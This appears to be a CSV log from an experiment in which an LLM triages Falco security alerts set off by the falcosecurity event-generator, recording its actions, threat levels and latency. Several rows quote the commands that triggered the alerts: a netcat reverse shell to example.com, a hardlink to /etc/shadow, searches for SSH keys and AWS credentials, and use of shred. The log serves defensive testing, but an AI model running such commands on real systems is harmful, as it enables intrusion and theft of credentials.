timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T10:51:21.675240,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,74,9922,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1864564634/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:51:31.213018,llm-analyzed,System user interactive,Informational,314,72,7958,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
2026-05-17T10:51:32.792112,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:51:42.509075,llm-analyzed,PTRACE anti-debug attempt,Notice,331,68,8137,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:51:44.088484,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:51:53.967716,llm-analyzed,Search Private Keys or Passwords,Warning,342,69,8299,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:52:04.664569,llm-analyzed,Directory traversal monitored file read,Warning,350,82,9114,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:52:12.704405,llm-analyzed,PTRACE anti-debug attempt,Notice,331,35,6450,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,stop,high,
2026-05-17T10:52:14.284026,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:52:24.222213,llm-analyzed,Search Private Keys or Passwords,Warning,342,69,8358,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:52:33.530986,llm-analyzed,Directory traversal monitored file read,Warning,350,55,7728,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:52:43.661843,llm-analyzed,Read sensitive file trusted after startup,Warning,381,58,8552,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:52:54.001337,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,62,8758,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:53:03.561201,llm-analyzed,Find AWS Credentials,Warning,367,53,7981,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:53:14.612987,llm-analyzed,Remove Bulk Data from Disk,Warning,385,75,9472,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1056880682,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:53:25.780451,llm-analyzed,Execution from /dev/shm,Warning,412,69,9561,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:53:36.591120,llm-analyzed,Execution from /dev/shm,Warning,436,77,9230,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:53:46.124150,llm-analyzed,Clear Log Activities,Warning,343,62,7952,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:53:56.197031,llm-analyzed,Create Symlink Over Sensitive Files,Warning,411,47,8492,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-685563460/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:53:57.777016,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:54:08.929151,llm-analyzed,Packet socket created in container,Notice,363,85,9573,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:54:10.836327,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:54:12.418228,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:54:23.042112,llm-analyzed,Fileless execution via memfd_create,Critical,376,69,9039,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:54:33.559724,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,418,52,8938,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-861507121/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:54:42.919510,llm-analyzed,System user interactive,Informational,314,67,7767,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:54:44.502345,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:54:54.761387,llm-analyzed,Packet socket created in container,Notice,363,66,8679,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,high,
2026-05-17T10:54:56.340337,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:54:57.920702,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:55:08.115909,llm-analyzed,Fileless execution via memfd_create,Critical,376,63,8613,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:55:20.858506,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,99,11162,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3659591051/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:55:29.361941,llm-analyzed,System user interactive,Informational,314,50,6924,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:55:30.939907,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:55:41.120120,llm-analyzed,PTRACE anti-debug attempt,Notice,331,77,8594,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:55:42.711105,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:55:52.313058,llm-analyzed,Search Private Keys or Passwords,Warning,342,63,8023,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:56:03.203955,llm-analyzed,Directory traversal monitored file read,Warning,350,85,9309,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:56:13.607258,llm-analyzed,Read sensitive file trusted after startup,Warning,381,65,8823,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:56:23.604200,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,57,8417,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:56:32.464775,llm-analyzed,Find AWS Credentials,Warning,367,40,7280,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:56:42.858006,llm-analyzed,Remove Bulk Data from Disk,Warning,385,63,8812,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3977651963,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:56:53.102799,llm-analyzed,Execution from /dev/shm,Warning,408,52,8662,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:57:02.940045,llm-analyzed,Execution from /dev/shm,Warning,430,57,8255,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:57:12.304631,llm-analyzed,Clear Log Activities,Warning,342,58,7770,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
2026-05-17T10:57:22.155024,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,43,8269,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-4097235232/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:57:23.736362,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:57:34.010560,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,48,8694,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3611764846/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,pause,medium,
2026-05-17T10:57:43.015698,llm-analyzed,System user interactive,Informational,314,59,7425,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:57:44.596335,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:57:54.558696,llm-analyzed,PTRACE anti-debug attempt,Notice,331,72,8382,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,high,
2026-05-17T10:57:56.139134,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,1,0,0,,rule,,,
2026-05-17T10:58:06.215621,llm-analyzed,Search Private Keys or Passwords,Warning,342,70,8498,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_a,true,0,1,0,,llm,alert,medium,
